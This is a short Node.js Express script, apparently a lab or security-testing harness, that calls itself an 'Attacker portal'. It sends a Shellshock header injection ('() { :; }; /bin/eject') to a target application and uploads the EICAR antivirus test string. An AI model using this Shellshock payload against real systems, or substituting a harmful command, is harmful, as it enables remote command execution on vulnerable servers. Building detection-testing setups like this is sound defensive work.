const express = require('express');
const request = require('request');
const app = express();
const serverPort = 80;

const victim = "http://application/";

app.get('/', (req, res) => res.send('Attacker portal'));

app.get('/shellshock', (req, res) => {
  const options = {
    url: victim,
    headers: {
      'User-Agent': '() { :; }; /bin/eject'
    }
  };

  request.get(options, function(err, response, body) {
    if (err){
      console.log(err);
    }
    console.log(body);
    res.send(body);
    });

});

app.get('/upload', (req, res) => {
  const options = {
    url: victim + "upload/",
    form: {
      file:'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    }
  };

  request.post(options, function(err, response, body) {
    if (err){
      console.log(err);
    }
    console.log(body);
    res.send(body);
    });

});

app.listen(serverPort, () => console.log(`Example app listening on port ${serverPort}!`));